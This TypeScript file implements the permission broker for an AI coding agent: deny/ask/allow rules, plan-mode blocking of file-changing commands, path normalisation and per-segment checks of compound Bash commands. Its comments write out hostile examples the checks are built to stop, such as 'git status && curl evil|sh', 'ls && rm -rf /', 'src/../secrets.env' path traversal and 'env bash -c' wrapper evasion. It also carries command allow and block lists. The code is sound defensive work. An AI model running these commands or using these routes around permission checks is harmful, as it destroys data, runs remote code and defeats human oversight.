// L1 权限仲裁（v2.8 §8.3、§5.2 permission-broker 行、§0.5 B-13）。
// 模式=EXE-001 四模式（首版不含 [CC] 分类器 auto，M5+ MAY 第五档）；评估序 deny→ask→allow 首匹配定结果（§8.3）；
// deny 恒赢（B-13）——deny 规则先于一切，任何 allow 规则/模式都不能解锁（[CC] STo 复核同构："hook allow 永远不能解锁一条
// deny 规则"，dig-02 §1 逐字）。Plan 模式改文件类拦截=模式级硬门（[CC] 2.1.212 漏洞回归要求，§8.3 L381）。
// 规则清洗：M1 切片=allow 禁裸通配（[CC] chunk-4svxqcrq）；WP-07 补齐三件=rooted/home 锚定拒绝+网络命令白名单（65 项
// 实测）+段式形状校验（sanitize.ts，dig-02 §2.1/§2.2）。
// WP-07 评估序对质结论（M1 核验遗留"Plan 硬门与 ask 相对序"）：Plan 硬门位于 ask 规则之前——硬门=模式级安全边界
//（[CC] 2.1.212 回归面），语义上是"模式能否执行该操作"的先决问题，先于"规则要求确认"（§8.3 评估序原文仅钉
// deny→ask→allow 首匹配；硬门插在 ask 前使 plan 下改文件类不可经 allow 规则解锁，[自定] 保守序，登记结果页）。

import { sanitizeAllowSpecifier } from "./sanitize.ts";

export type PermissionMode = "default" | "acceptEdits" | "plan" | "bypassPermissions";
export type PermissionDecision = "allow" | "deny" | "ask";

/** EXE-001 循环切换序（首版四模式，无 auto）。 */
export const PERMISSION_MODES: readonly PermissionMode[] = ["default", "acceptEdits", "plan", "bypassPermissions"];

export interface PermissionRule {
  tool: string;
  /** null=该工具全部调用。 */
  specifier: string | null;
}

export interface Ruleset {
  deny: string[];
  ask: string[];
  allow: string[];
}

const TOOL_NAME_RE = /^[\w*-]+$/;

/** 规则语法 `Tool(specifier)`；裸 `Tool`=全调用；通配仅 tool 名尾部（`mcp__s__*` 形态保留给 M4+）。 */
export function parseRule(raw: string): PermissionRule {
  const m = /^([\w*-]+)(?:\(([\s\S]*)\))?$/.exec(raw.trim());
  if (!m || !TOOL_NAME_RE.test(m[1]!)) throw new Error(`invalid permission rule: ${raw}`);
  return { tool: m[1]!, specifier: m[2] ?? null };
}

/** allow 侧禁裸通配（[CC] chunk-4svxqcrq）：Bash specifier 裸通配无效；工具名通配仅 `mcp__` 前缀形态（dig-02 §2.1：通配只允许在 mcp__<server>__ 之后的 tool 位）。 */
export function parseRuleset(raw: Ruleset, side: keyof Ruleset): PermissionRule[] {
  return raw[side].map((r) => {
    const parsed = parseRule(r);
    if (side === "allow") {
      if (parsed.tool === "Bash" && (parsed.specifier === null || parsed.specifier === "*")) {
        throw new Error(`invalid allow rule (wildcard not supported): ${r}`);
      }
      if (parsed.tool.includes("*") && !parsed.tool.startsWith("mcp__")) {
        throw new Error(`invalid allow rule (tool name wildcard only for mcp__ prefix): ${r}`);
      }
      // WP-07 清洗三件（sanitize.ts）：rooted/home 拒绝+网络命令白名单+段式形状
      if (parsed.specifier !== null) {
        const f = sanitizeAllowSpecifier(parsed.tool, parsed.specifier);
        if (!f.ok) throw new Error(`invalid allow rule: ${f.reason}`);
      }
    }
    return parsed;
  });
}

/** specifier 匹配：Bash 对命令串整串 glob（`*` 跨空格，[CC] "git *" 前缀语义；复合命令由 evaluate 先分段
 *  ——S3-1，本函数只对单段/整串主题判定）；路径类对 file_path/path glob（`**` 跨目录）。 */
export function ruleMatches(rule: PermissionRule, toolName: string, input: unknown): boolean {
  if (!toolMatches(rule.tool, toolName)) return false;
  if (rule.specifier === null) return true;
  const subject = specifierSubject(toolName, input);
  if (subject === null) return rule.specifier === "*";
  return globMatch(rule.specifier, subject);
}

function toolMatches(pattern: string, toolName: string): boolean {
  if (pattern.endsWith("*")) return toolName.startsWith(pattern.slice(0, -1));
  return pattern === toolName;
}

/**
 * S3-7（全仓审查 2026-10-01）路径主体归一化：规则侧已拒 `..`（sanitize.ts isRootedSpecifier），
 * 但输入侧原样匹配——`allow Edit(src/**)` 会被 `src/../secrets.env` 越过（executor `resolve(cwd, path)`
 * 解析出界，沙箱默认关无其他拦截面）。折叠 `.`/`..` 段（与 resolve 同语义：根位 `..` 截顶、相对位
 * 保留前导 `..`），越锚后主体不再命中锚定规则 → 回落 ask（fail-closed 方向）。
 */
function normalizePathSubject(raw: string): string {
  const norm = raw.replaceAll("\\", "/");
  const rooted = norm.startsWith("/") || /^[A-Za-z]:(?:\/|$)/.test(norm);
  const out: string[] = [];
  for (const seg of norm.split("/")) {
    if (seg === "" || seg === ".") continue;
    if (seg === "..") {
      const atRoot = out.length === 0 || (out.length === 1 && /^[A-Za-z]:$/.test(out[0]!));
      if (!atRoot && out[out.length - 1] !== "..") {
        out.pop();
      } else if (!rooted) {
        out.push("..");
      }
      // rooted 且已在根/盘符根 → 截顶丢弃（path.resolve 同语义）
      continue;
    }
    out.push(seg);
  }
  const prefix = norm.startsWith("/") ? "/" : "";
  return prefix + out.join("/");
}

function specifierSubject(toolName: string, input: unknown): string | null {
  if (typeof input !== "object" || input === null) return null;
  const rec = input as Record<string, unknown>;
  if (toolName === "Bash") return typeof rec.command === "string" ? rec.command : null;
  const p = rec.file_path ?? rec.path;
  return typeof p === "string" ? normalizePathSubject(p) : null;
}

/** 极简 glob：pattern 含 `/` → 段匹配（`**` 跨段、`*` 不跨段）；不含 `/` → 单段（Bash 命令语义：`*`=任意字符）。 */
export function globMatch(pattern: string, subject: string): boolean {
  if (pattern.includes("/")) {
    return matchSegs(pattern.split("/"), subject.split("/"), 0, 0);
  }
  return segRegex(pattern, true).test(subject);
}

function matchSegs(pat: string[], subj: string[], pi: number, si: number): boolean {
  if (pi === pat.length) return si === subj.length;
  const seg = pat[pi]!;
  if (seg === "**") {
    for (let k = si; k <= subj.length; k++) if (matchSegs(pat, subj, pi + 1, k)) return true;
    return false;
  }
  if (si >= subj.length || !segRegex(seg, false).test(subj[si]!)) return false;
  return matchSegs(pat, subj, pi + 1, si + 1);
}

function segRegex(seg: string, crossAny: boolean): RegExp {
  let re = "^";
  for (let i = 0; i < seg.length; i++) {
    const ch = seg[i]!;
    if (ch === "*") {
      if (seg[i + 1] === "*") { re += ".*"; i++; }
      else re += crossAny ? ".*" : "[^/]*";
    } else if (ch === "?") re += crossAny ? "." : "[^/]";
    else re += ch.replace(/[.+^${}()|[\]\\]/g, "\\$&");
  }
  return new RegExp(re + "$");
}

/**
 * S3-1（全仓审查 2026-10-01；规格 §8.3「复合 Bash 逐段检查防前缀伪装」）：Bash 命令分段——
 * 按未引号态的 `|| && ; | & \n` 切（与 isMutatingBash 同符集，但引号/转义内不切：`echo "a && b"` 为单段）。
 * 返回含引号原文的段（不 trim，供 glob 用原文匹配）。
 */
export function splitBashSegments(command: string): string[] {
  const segments: string[] = [];
  let cur = "";
  let quote: string | null = null;
  let i = 0;
  while (i < command.length) {
    const ch = command[i]!;
    if (quote !== null) {
      if (ch === "\\" && quote === '"' && i + 1 < command.length) {
        cur += ch + command[i + 1]!;
        i += 2;
        continue;
      }
      if (ch === quote) quote = null;
      cur += ch;
      i++;
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      cur += ch;
      i++;
      continue;
    }
    if (ch === "\\" && i + 1 < command.length) {
      cur += ch + command[i + 1]!;
      i += 2;
      continue;
    }
    if (ch === "\n") {
      segments.push(cur);
      cur = "";
      i++;
      continue;
    }
    if (ch === "&" || ch === ";" || ch === "|") {
      if (ch !== ";" && command[i + 1] === ch) {
        segments.push(cur);
        cur = "";
        i += 2;
        continue;
      }
      segments.push(cur);
      cur = "";
      i++;
      continue;
    }
    cur += ch;
    i++;
  }
  segments.push(cur);
  return segments;
}

/** 规则评估用 Bash 主题集：>1 个非空段=逐段（S3-1），否则回落整串原文（非复合命令保持原语义）。 */
function bashSubjects(command: string): string[] {
  const segs = splitBashSegments(command)
    .map((s) => s.trim())
    .filter((s) => s !== "");
  return segs.length > 1 ? segs : [command];
}

// —— Plan 模式改文件类 Bash 拦截（§8.3 L381：[CC] 2.1.212 漏洞回归；fail-closed 启发式 [自定]）——

/** 只读命令白名单：白名单外一律视为可变更（fail-closed）。git 仅 status/log/diff/show/blame 视为只读。
 *  S3-3（全仓审查 2026-10-01）：`env` 移出白名单改走前缀穿透（见 isMutatingBash 内 env 循环）——
 *  留白名单会因 stripQuoted 吞掉 `env bash -c "echo x > f"` 内层重定向而 fail-open；find/sort 保留
 *  白名单但须过写面旗标检查（下两枚正则）。 */
const READONLY_COMMANDS: ReadonlySet<string> = new Set([
  "ls", "pwd", "cat", "head", "tail", "wc", "grep", "rg", "find", "which", "where", "whereis", "file", "stat", "du", "df",
  "ps", "printenv", "whoami", "hostname", "uname", "date", "id", "tree", "sort", "uniq", "cut", "tr",
  "diff", "comm", "jq", "man", "echo", "printf", "test", "true", "false", "type", "tasklist", "dir",
]);

/** S3-3 find 写面旗标（-exec/-execdir/-ok/-okdir/-delete/-fls/-fprint/-fprint0/-fprintf）——
 *  对原串带引号边界匹配（`"-delete"` 引号形同命中，stripQuoted 吞不掉）；fail-closed 方向：误报只多拦。 */
const FIND_WRITE_FLAGS_RE = /(?:^|[\s"'`])(?:-{1,2}exec(?:dir)?|-{1,2}ok(?:dir)?|-delete|-fls|-{1,2}fprintf|-{1,2}fprint0?)(?=[\s"'`]|$)/;
/** S3-3 sort 写面旗标（-o/--output 全形：附着 `-oFILE`、组合 `-ro`、`--o` 缩写与 `--output=`）——
 *  单横线短旗标簇含 `o` 即命中（sort 短旗标仅 -o 含 o；簇后为附着值故匹配到 o 即止），fail-closed 方向。 */
const SORT_OUTPUT_FLAGS_RE = /(?:^|[\s"'`])(?:--o[A-Za-z]*|-[A-Za-z]*o)/;

/** 包装器/提权前缀一律视为可变更（[CC] 包装器穿透集合的 fail-closed 反向：不可静态证明只读即拦）。 */
const WRAPPER_COMMANDS: ReadonlySet<string> = new Set(["sudo", "doas", "xargs", "exec", "nohup", "timeout", "nice", "watch", "eval", "source", "."]);

const GIT_READONLY_SUBCOMMANDS: ReadonlySet<string> = new Set(["status", "log", "diff", "show", "blame"]);

/** Plan 模式 Bash 可变更性判定（启发式，fail-closed）：重定向/命令替换/管道段首词白名单外/包装器 → 可变更。
 *  S3-3（全仓审查 2026-10-01）：①env 走前缀穿透——跳过 env 旗标/赋值取真正被启动的命令重新判定，
 *  不可静态证明只读即拦（`env bash -c "…"` 内层 bash 非白名单 → 可变更；`env ls` 穿透后仍只读）；
 *  ②find/sort 写面旗标对**原串**查（stripQuoted 吞引号形，`"-delete"`/`"-o"` 亦命中）。 */
export function isMutatingBash(command: string): boolean {
  const stripped = stripQuoted(command);
  // 分段符含单 `&`（后台操作符）——`echo hi & rm -rf x` 的第二段必须独立受检（V 退回①：[CC] 2.1.212 回归面）
  for (const segment of stripped.split(/(?:\|\||&&|;|\||\n|&)/)) {
    const seg = segment.trim();
    if (seg === "") continue;
    if (/./.test(seg) && /[<>]/.test(seg)) return true; // 重定向（含 > >> 2> &> <）
    if (seg.includes("$(") || seg.includes("`")) return true; // 命令替换不透明，fail-closed
    const tokens = seg.split(/\s+/).filter(Boolean);
    let idx = 0;
    const skipAssign = () => {
      while (idx < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[idx]!)) idx++;
    };
    skipAssign(); // 剥离 env 赋值
    let head = (tokens[idx] ?? "").toLowerCase();
    while (head === "env") {
      // env 前缀穿透（S3-3；sanitize.ts WRAPPER_PREFIXES 同款 unwrap 语义，判定方向 fail-closed）：
      // 跳过 env 自身旗标（-i/-u NAME/--unset=…/…）与赋值，取真正被启动的命令做首词判定；
      // 旗标值形如 `-u NAME` 的 NAME 会误当首词（非白名单 → 可变更）——保守多拦，可接受。
      idx++;
      while (idx < tokens.length && (tokens[idx]!.startsWith("-") || /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[idx]!))) idx++;
      skipAssign();
      head = (tokens[idx] ?? "").toLowerCase();
    }
    if (head === "") continue;
    if (head === "git") {
      const sub = (tokens[idx + 1] ?? "").toLowerCase();
      if (!GIT_READONLY_SUBCOMMANDS.has(sub)) return true;
      continue;
    }
    if (WRAPPER_COMMANDS.has(head)) return true;
    if (head === "sed" && tokens.some((t) => /^-[^-]*[iw]/.test(t) || t === "--in-place")) return true;
    if (head === "find" && FIND_WRITE_FLAGS_RE.test(command)) return true;
    if (head === "sort" && SORT_OUTPUT_FLAGS_RE.test(command)) return true;
    if (!READONLY_COMMANDS.has(head)) return true;
  }
  return false;
}

function stripQuoted(s: string): string {
  return s.replace(/'(?:[^'\\]|\\.)*'/g, "''").replace(/"(?:[^"\\]|\\.)*"/g, '""');
}

function isMutatingTool(toolName: string, input: unknown): boolean {
  if (toolName === "Write" || toolName === "Edit") return true;
  if (toolName === "Bash") {
    const cmd = (input as Record<string, unknown> | null)?.command;
    return typeof cmd === "string" ? isMutatingBash(cmd) : true;
  }
  return false;
}

export interface BrokerEvaluateResult {
  decision: PermissionDecision;
  reason: string;
}

export interface PermissionBroker {
  mode(): PermissionMode;
  setMode(mode: PermissionMode): void;
  /** EXE-001 循环序推进一档。 */
  cycle(): PermissionMode;
  /**
   * WP-03（ORC-022 权限规则继承）：派生子 broker——规则数组共享（运行时 addAllow 双向可见），
   * 模式独立（agent 定义 permissionMode 覆盖不影响父会话；CC §6.2 step2 `Pe = nt ?? e.permissionMode` 同构）。
   */
  derive(mode?: PermissionMode): PermissionBroker;
  evaluate(toolName: string, input: unknown): BrokerEvaluateResult;
  /**
   * WP-07（§8.3 持久化）："总是允许"运行时追加 allow 规则（落 local 层由调用方 persistAlwaysAllow 负责；
   * 解析清洗与构造期同规——违规即抛）。返回成功追加的规则原文。
   */
  addAllow(raw: string): string;
}

export interface BrokerOptions {
  mode?: PermissionMode;
  rules?: Partial<Ruleset>;
}

/** 评估序（§8.3）：deny 规则 → Plan 硬门 → ask 规则 → allow 规则 → 模式缺省；deny 恒赢（B-13）。 */
export function createPermissionBroker(opts: BrokerOptions = {}): PermissionBroker {
  const deny = parseRuleset({ deny: opts.rules?.deny ?? [], ask: [], allow: [] }, "deny");
  const ask = parseRuleset({ deny: [], ask: opts.rules?.ask ?? [], allow: [] }, "ask");
  const allow: PermissionRule[] = parseRuleset({ deny: [], ask: [], allow: opts.rules?.allow ?? [] }, "allow");
  const allowRaw: string[] = [...(opts.rules?.allow ?? [])];
  return buildBroker(deny, ask, allow, allowRaw, opts.mode ?? "default");
}

/** WP-03：规则数组共享的 broker 体（derive 派生同一数组实例——addAllow 双向可见，模式独立）。 */
function buildBroker(
  deny: PermissionRule[],
  ask: PermissionRule[],
  allow: PermissionRule[],
  allowRaw: string[],
  initialMode: PermissionMode,
): PermissionBroker {
  let mode: PermissionMode = initialMode;
  return {
    mode: () => mode,
    setMode: (m) => {
      mode = m;
    },
    derive: (m) => buildBroker(deny, ask, allow, allowRaw, m ?? mode),
    cycle: () => {
      mode = PERMISSION_MODES[(PERMISSION_MODES.indexOf(mode) + 1) % PERMISSION_MODES.length]!;
      return mode;
    },
    addAllow: (raw) => {
      const [parsed] = parseRuleset({ deny: [], ask: [], allow: [raw] }, "allow");
      allow.push(parsed);
      allowRaw.push(raw);
      return raw;
    },
    evaluate: (toolName, input) => {
      // S3-1（规格 §8.3「复合 Bash 逐段检查防前缀伪装」）：Bash 复合命令逐段受检——deny/ask=任一段命中
      // 即中（`ls && rm -rf /` 不再绕过 deny `Bash(rm *)`），allow=**每段**都被某条 allow 规则覆盖
      // （`Bash(git *)` 不再整串 glob 放行 `git status && curl evil|sh`）；单段命令/非 Bash 回落整串原语义。
      const subjects: unknown[] =
        toolName === "Bash" && typeof (input as Record<string, unknown> | null)?.command === "string"
          ? bashSubjects((input as { command: string }).command).map((command) => ({ command }))
          : [input];
      const segHit = (r: PermissionRule) => subjects.some((sub) => ruleMatches(r, toolName, sub));
      for (const r of deny) {
        if (segHit(r)) return { decision: "deny", reason: `deny rule: ${r.tool}${r.specifier ? `(${r.specifier})` : ""}` };
      }
      if (mode === "plan" && isMutatingTool(toolName, input)) {
        return { decision: "deny", reason: `plan mode blocks file-mutating ${toolName}` };
      }
      for (const r of ask) {
        if (segHit(r)) return { decision: "ask", reason: `ask rule: ${r.tool}${r.specifier ? `(${r.specifier})` : ""}` };
      }
      const allowHit =
        subjects.length > 0 && subjects.every((sub) => allow.some((r) => ruleMatches(r, toolName, sub)))
          ? allow.find((r) => ruleMatches(r, toolName, subjects[0]!))
          : undefined;
      if (allowHit) return { decision: "allow", reason: `allow rule: ${allowHit.tool}${allowHit.specifier ? `(${allowHit.specifier})` : ""}` };
      switch (mode) {
        case "bypassPermissions":
          return { decision: "allow", reason: "mode: bypassPermissions (Auto)" };
        case "acceptEdits":
          return toolName === "Write" || toolName === "Edit"
            ? { decision: "allow", reason: "mode: acceptEdits auto-approves file edits" }
            : { decision: "ask", reason: "mode: acceptEdits (non-edit tool)" };
        case "plan":
          return toolName === "Read" || toolName === "Glob" || toolName === "Grep" || toolName === "Bash"
            ? { decision: "allow", reason: "mode: plan (read-only)" }
            : { decision: "ask", reason: "mode: plan (non-read tool)" };
        default:
          return { decision: "ask", reason: "mode: default (Manual)" };
      }
    },
  };
}